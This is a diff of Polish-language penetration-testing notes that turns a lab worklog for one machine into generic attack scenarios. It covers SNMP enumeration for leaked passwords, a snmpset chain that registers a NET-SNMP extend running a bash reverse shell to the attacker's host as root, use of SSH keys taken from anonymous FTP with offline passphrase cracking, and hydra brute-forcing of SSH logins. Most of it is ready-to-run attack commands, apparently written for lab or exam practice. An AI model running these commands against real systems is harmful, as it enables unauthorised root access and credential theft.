@@ -3166,94 +3166,84 @@ cat /root/proof.txt 2>/dev/null; cat /home/*/local.txt 2>/dev/null
 
 # 15. Wszystko i nic (worklog / stuck-buster)
 
-> **Do czego to jest:** kiedy utknę na maszynie, wrzucam ją tu. Format: `## <IP> — <opis> — STATUS`, w środku **Zrobione**, **Analiza (co przeoczone)** i **Co spróbować (priorytet)**. Kiero mówi „mam problem z .X, sprawdź raporty" → aktualizuję odpowiedni wpis.
+> **Do czego to jest:** scratchpad na techniki/scenariusze, które kiedyś mnie zablokowały — zapisane **generycznie** (metoda, nie konkretna maszyna), żeby dało się użyć ponownie. Wszędzie `$ip` = cel, `$lhost` = Kali, `$user` = znaleziony login.
 
 ---
 
-## 192.168.111.149 — Linux Ubuntu 18.04 (FTP/SSH/Apache/SNMP) — 🔴 STUCK
+## Scenariusz: SNMP (161/udp) otwarty — enumeracja + abuse
 
-**Porty:** 21 vsftpd 3.0.3 · 22 OpenSSH 8.2p1 · 80 Apache 2.4.41 (default page) · **161/udp SNMP (community `public`)**
+**Trop:** SNMP z domyślnym community (`public`) wycieka userów, procesy z hasłami w cmdline, a przy community RW daje RCE jako root.
 
-### 🆕 UPDATE — anonymous FTP oddał klucze SSH
-FTP anon → pobrane: **`id_rsa`, `id_rsa.pub`, `id_rsa_2`** (owner UID 114/GID 119 = konto systemowe). `ssh -i` prosił od razu o **hasło**, nie o passphrase → klucz NIE został użyty. Przyczyny do wyeliminowania:
+### snmpwalk — jak to czytać
 ```bash
-chmod 600 id_rsa id_rsa_2        # za otwarte perms => ssh ignoruje klucz i pyta o haslo
-cat id_rsa.pub                   # komentarz = user@host -> POZNAJ wlasciciela (kiero? JOHN?)
-# wymus uzycie klucza + verbose, testuj OBA klucze x OBU userow (john/kiero):
-ssh -v -o IdentitiesOnly=yes -i id_rsa   john@192.168.111.149
-ssh -v -o IdentitiesOnly=yes -i id_rsa_2 john@192.168.111.149
-ssh -v -o IdentitiesOnly=yes -i id_rsa   kiero@192.168.111.149
-#   w -v szukaj: "Offering public key" / "Server accepts key"
-# jesli teraz pyta "Enter passphrase for key" => klucz zaszyfrowany, lam offline:
-ssh2john id_rsa > id_rsa.hash ; john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
-john id_rsa.hash --show
-```
-> ⚠️ **Lekcja:** `ssh -i` pyta o *hasło serwera* (nie passphrase) = klucz odrzucony (złe perms LUB zły user LUB serwer go nie autoryzuje). Passphrase-prompt = klucz OK, tylko zaszyfrowany. Rozróżniaj te dwa prompty.
-
-### ✅ Zrobione
-- Nmap TCP + UDP (161 snmp open).
-- `snmpwalk -c public -v1` → system info: host `...-149-ubuntu1804-kiero-...`, kontakt `me@example.org`.
-- `snmpwalk` NET-SNMP-EXTEND-MIB → **extend „RESET" = `./home/john/RESET_PASSWD`** → output: *„Resetting password of **kiero** to the default value"*.
-- gobuster :80 (bez wyniku w raporcie).
-- LFI na Apache → nic (**spodziewane** — strona to statyczny default „It works", nie ma parametru do LFI; to ślepy zaułek, odpuść).
-
-### 🔎 Analiza — co Ci mówi SNMP (przeoczone tropy)
-1. **Masz już dwóch userów: `john` i `kiero`.** To są konta SSH do zaatakowania.
-2. **Hint „resetuje hasło kiero do wartości domyślnej"** = kiero ma słabe/domyślne hasło → **SSH jako kiero** to prawdopodobna ścieżka wejścia.
-3. **Zrobiłeś tylko 2 gałęzie SNMP.** Nie zrobiłeś **pełnego walka** — a tam (w tabeli procesów) hasła wyciekają z linii poleceń. To jest to, czego nie umiesz — ściąga niżej.
-4. **Jest skonfigurowany extend** → jeśli istnieje community **z prawem zapisu** (RW), SNMP daje **RCE jako root** (snmpd chodzi zwykle jako root). To potencjalnie instant-win.
-
-### 🎯 Co spróbować — w tej kolejności
-```bash
-KALI=192.168.45.239; T=192.168.111.149
-# ── 1. PEŁNY snmpwalk (najpierw to — tu leca creds z cmdline procesow) ──
-snmpwalk -v2c -c public $T .1 > snmp_full.txt                 # zrzut CALEGO drzewa
-snmpwalk -v2c -c public $T 1.3.6.1.2.1.25.4.2.1.5             # PARAMETRY procesow <- hasla!
-grep -iE 'pass|pwd|user|-c |mysql|ftp|key' snmp_full.txt      # przekop zrzut
-snmp-check $T -c public                                        # ladny, poukladany widok
-
-# ── 2. SNMP write -> RCE jako root (jesli istnieje RW community) ──
-onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $T  # znajdz community
-snmpset -v2c -c private $T iso.3.6.1.2.1.1.6.0 s TEST          # przechodzi = MASZ zapis (default RW: private)
-#   jesli zapis dziala -> zarejestruj wlasny extend i wykonaj jako root:
-snmpset -v2c -c private $T 'NET-SNMP-EXTEND-MIB::nsExtendStatus."x"' i 5 \
-  'NET-SNMP-EXTEND-MIB::nsExtendCommand."x"' s /bin/bash \
-  'NET-SNMP-EXTEND-MIB::nsExtendArgs."x"' s "-c 'bash -i >& /dev/tcp/$KALI/4444 0>&1'" \
-  'NET-SNMP-EXTEND-MIB::nsExtendStatus."x"' i 1
-#   nc -lvnp 4444 PRZED tym; odczyt outputu = uruchomienie komendy (run-on-read):
-snmpwalk -v2c -c private $T 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."x"'
-
-# ── 3. SSH jako kiero/john (hint o domyslnym hasle) ──
-hydra -l kiero -P /usr/share/wordlists/rockyou.txt ssh://$T -t 4 -f    # -f = stop po trafieniu
-hydra -l john  -P /usr/share/wordlists/rockyou.txt ssh://$T -t 4 -f
-#   zgadnij tez recznie: kiero:kiero, kiero:password, kiero:kiero123
-
-# ── 4. FTP anonymous (szybki strzal) ──
-ftp $T            # login: anonymous  haslo: anonymous  (lub puste)
-wget -m --no-passive "ftp://anonymous:anonymous@$T/"                   # zrzuc co widac
-
-# ── 5. Web re-enum (NISKI priorytet — LFI odpadlo) ──
-gobuster dir -u http://$T -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip -t 40
-```
-
-### 📚 snmpwalk — ściąga (bo pytałeś)
-```bash
-# Skladnia:  snmpwalk -v<wersja> -c <community> <IP> [OID]
-#   -v1 / -v2c  = wersja protokolu (v2c SZYBSZE, uzywaj domyslnie; -v1 tylko gdy v2c milczy)
-#   -c public   = community string (jak "haslo" tylko-do-odczytu; default RO=public, RW=private)
+# Skladnia:  snmpwalk -v<wersja> -c <community> $ip [OID]
+#   -v1 / -v2c  = wersja (v2c SZYBSZE, domyslnie; -v1 tylko gdy v2c milczy)
+#   -c public   = community string (RO=public, RW=private to najczestsze defaulty)
 #   brak OID    = zrzuca CALE drzewo od korzenia (.1)
-snmpwalk -v2c -c public $T                       # wszystko
-snmpwalk -v2c -c public $T system                # tylko galaz 'system'
+snmpwalk -v2c -c public $ip .1 > snmp_full.txt        # pelny zrzut
+snmp-check $ip -c public                              # poukladany widok
 # Najcenniejsze OIDy (naucz sie tych 4):
-#   1.3.6.1.2.1.25.4.2.1.2  hrSWRunName        nazwy uruchomionych procesow
-#   1.3.6.1.2.1.25.4.2.1.4  hrSWRunPath        sciezki binarek
-#   1.3.6.1.2.1.25.4.2.1.5  hrSWRunParameters  ARGUMENTY procesow  <-- tu wyciekaja hasla
-#   1.3.6.1.2.1.25.6.3.1.2  hrSWInstalledName  zainstalowany software
-# Gdy brakuje nazw MIB (widzisz iso.3.6...): sudo apt install snmp-mibs-downloader
-#   i zakomentuj 'mibs :' w /etc/snmp/snmp.conf  -> beda ladne nazwy zamiast cyfr.
+snmpwalk -v2c -c public $ip 1.3.6.1.2.1.25.4.2.1.2    # hrSWRunName        nazwy procesow
+snmpwalk -v2c -c public $ip 1.3.6.1.2.1.25.4.2.1.4    # hrSWRunPath        sciezki binarek
+snmpwalk -v2c -c public $ip 1.3.6.1.2.1.25.4.2.1.5    # hrSWRunParameters  ARGUMENTY <- tu leca hasla
+snmpwalk -v2c -c public $ip 1.3.6.1.2.1.25.6.3.1.2    # hrSWInstalledName  zainstalowany soft
+grep -iE 'pass|pwd|user|-c |mysql|ftp|key' snmp_full.txt
+# Brak nazw MIB (widac iso.3.6...): sudo apt install snmp-mibs-downloader
+#   + zakomentuj 'mibs :' w /etc/snmp/snmp.conf -> ladne nazwy zamiast cyfr.
+```
+> 💎 Z pola `description` userów, kontaktu i `NET-SNMP-EXTEND-MIB` często wyciekają **nazwy kont** i wskazówki o hasłach (np. skrypt „reset password to default"). Spisuj je jako listę loginów do dalszych ataków (SSH/spray).
+
+### SNMP write → RCE jako root (gdy istnieje community RW)
+```bash
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $ip  # znajdz community
+snmpset -v2c -c private $ip iso.3.6.1.2.1.1.6.0 s TEST     # przechodzi = MASZ zapis (RW)
+# jesli zapis dziala -> zarejestruj wlasny NET-SNMP extend i wykonaj jako root (snmpd = root):
+snmpset -v2c -c private $ip 'NET-SNMP-EXTEND-MIB::nsExtendStatus."x"' i 5 \
+  'NET-SNMP-EXTEND-MIB::nsExtendCommand."x"' s /bin/bash \
+  'NET-SNMP-EXTEND-MIB::nsExtendArgs."x"' s "-c 'bash -i >& /dev/tcp/$lhost/4444 0>&1'" \
+  'NET-SNMP-EXTEND-MIB::nsExtendStatus."x"' i 1
+# nc -lvnp 4444 PRZED; odczyt outputu = uruchomienie komendy (run-on-read):
+snmpwalk -v2c -c private $ip 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."x"'
 ```
 
-> 💡 **Mój typ na tę maszynę:** wejście przez **SSH jako kiero** (krok 3) lub **SNMP-write→root** (krok 2). Pełny walk (krok 1) zrób i tak — nauczysz się i możesz złapać hasło po drodze. Web = zaułek. Napisz mi co zwróciły kroki 1–4, to zawężę.
+---
+
+## Scenariusz: klucze SSH z anonymous FTP / czytelnego share (id_rsa)
+
+**Trop:** anonymous FTP albo otwarty share oddaje `id_rsa`/`id_rsa_2`/`id_rsa.pub`. Klucz publiczny (komentarz) mówi, do kogo pasuje.
+```bash
+ftp $ip                                   # anonymous / anonymous (lub puste haslo)
+wget -m --no-passive "ftp://anonymous:anonymous@$ip/"   # zrzuc cala zawartosc
+chmod 600 id_rsa*                         # za otwarte perms => ssh IGNORUJE klucz i pyta o haslo
+cat id_rsa.pub                            # komentarz = user@host -> POZNAJ wlasciciela
+# wymus uzycie klucza + verbose; testuj kazdy klucz x kazdy znaleziony user:
+ssh -v -o IdentitiesOnly=yes -i id_rsa $user@$ip
+#   w -v szukaj: "Offering public key" / "Server accepts key"
+# jesli pyta "Enter passphrase for key" => klucz zaszyfrowany, lam offline:
+ssh2john id_rsa > id_rsa.hash ; john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+john id_rsa.hash --show                   # pokaz passphrase
+```
+> ⚠️ **Rozróżniaj prompty:** „*<user>'s password:*" = klucz odrzucony (złe perms / zły user / nieautoryzowany). „*Enter passphrase for key*" = klucz OK, tylko zaszyfrowany. Pierwszy prompt → napraw perms i user, ZANIM uznasz klucz za bezużyteczny.
+
+---
+
+## Scenariusz: słabe/„domyślne" hasło konta przez SSH
+```bash
+hydra -l $user -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 4 -f   # -f = stop po trafieniu
+#   zgadnij tez recznie warianty od loginu: $user:$user, $user:password, $user:$user123
+```
+> 💎 Gdy enum (SNMP/web/share) sugeruje „hasło zresetowane do domyślnego" — najpierw ręcznie warianty loginu, potem rockyou. Uważaj na lockout policy.
+
+---
+
+## Scenariusz: Apache/nginx pokazuje tylko default page
+
+**Trop:** statyczna strona domyślna („It works" / „Welcome to nginx") **nie ma parametru** → LFI/SQLi nie mają się gdzie wpiąć. Zaułek, dopóki nie znajdziesz aplikacji.
+```bash
+gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip -t 40
+gobuster vhost -u http://$ip --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+```
+> 💡 Nie forsuj LFI na statycznym default page — najpierw znajdź **dynamiczną** ścieżkę/parametr (dir/vhost bruteforce). Bez parametru nie ma czego wstrzykiwać.
 
 ---
 
